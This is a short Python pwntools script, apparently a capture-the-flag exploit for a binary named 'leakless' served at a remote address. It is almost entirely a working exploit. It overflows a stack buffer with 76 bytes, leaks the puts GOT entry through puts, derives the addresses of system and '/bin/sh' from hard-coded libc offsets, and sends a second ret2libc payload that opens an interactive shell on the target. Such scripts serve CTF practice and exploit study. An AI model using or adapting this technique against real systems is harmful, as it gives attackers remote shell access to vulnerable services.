from pwn import *
r = process("./leakless")
r = remote("35.243.188.20",2002)
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
def main():
    offset = 76
    puts_plt = 0x080483f0
    read_GOT = 0x0804a00c
    puts_GOT = 0x0804a018
    p = "A" * 76
    p += p32(puts_plt)
    p += p32(0x080485fa)
    p += p32(puts_GOT)

    r.sendline(p)

    data = u32(r.recv(4))
    log.info("leaking puts_GOT : " + hex(data))

    libc_base = data   #libc.symbols['puts']
    system = libc_base - 0x2a9d0 #+ libc.symbols['system']
    binsh = libc_base + 0x1115c1 #libc.search("/bin/sh").next()

    p = "A" * 76
    p += p32(system)
    p += p32(0)
    p += p32(binsh)

    r.sendline(p)

    r.interactive()

if __name__ == '__main__':
    main()
